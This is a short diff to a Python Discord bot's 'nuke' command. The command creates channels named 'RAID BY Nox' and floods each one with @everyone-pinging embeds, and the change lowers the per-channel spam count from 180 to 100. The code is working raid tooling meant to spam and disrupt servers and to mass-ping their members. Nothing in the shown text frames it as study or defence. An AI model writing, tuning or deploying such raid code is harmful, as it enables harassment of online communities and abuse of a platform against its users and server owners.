@@ -43,7 +43,7 @@ async def nuke(ctx):
                 channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
                 embed = discord.Embed(description="@everyone\n☠️ RAID BY Nox ☠️", color=discord.Color.red())
                 embed.set_image(url=gifs[_ % len(gifs)])
-                for _ in range(180):
+                for _ in range(100):
                     asyncio.create_task(channel.send(embed=embed))
             except:
                 continue
